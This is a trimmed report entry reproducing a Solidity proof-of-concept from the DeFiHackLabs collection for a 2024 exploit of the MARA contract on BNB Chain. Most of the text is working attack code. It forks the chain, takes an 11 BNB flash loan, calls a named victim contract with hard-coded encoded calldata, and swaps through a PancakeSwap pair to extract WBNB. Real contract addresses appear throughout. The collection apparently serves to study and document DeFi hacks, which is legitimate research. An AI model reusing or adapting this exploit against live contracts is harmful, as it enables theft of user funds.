# [?] MARA exploit (2024-09)

## Summary
Severity: Unknown
Chain: BNB Chain
Component: MARA
Published: 2024-09
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/MARA_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    DVM dvm = DVM(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakePair pancake = IPancakePair(0x6E82575Ffa729471b9B412d689EC692225b1fFcB);
    address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address victim = 0xc6A8C02dd5A3DD1616eC072BFC7c9d3DF9682A63;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork("bsc", 42_538_916 - 1);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", wbnb.balanceOf(address(this)), 18);

        bytes memory data =
            hex"0000000000000000000000006098a5638d8d7e9ed2f952d35b2b67c34ec6b476000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000000000000000000000000000098a7d9b8314c0000";
        uint256 amount = 11 ether;
        dvm.flashLoan(amount, 0, address(this), data);

        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", wbnb.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        wbnb.withdraw(baseAmount);
        wbnb.approve(router, 10_000_000_000_000_000_000_000_000_000);
        bytes memory encoded =
            hex"5fc985ea000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000020000000000000000000000006e82575ffa729471b9b412d689ec692225b1ffcb0000000000000000000000006e82575ffa729471b9b412d689ec692225b1ffcb0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        // console.logBytes(encoded);
        (bool success,) = victim.call{value: 11 ether}(encoded);

        require(success, "Call failed");

        uint256 amountOut = 19_800_000_000_000_000_000;

        pancake.swap(0, amountOut, address(this), "");

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/MARA_exp.sol_
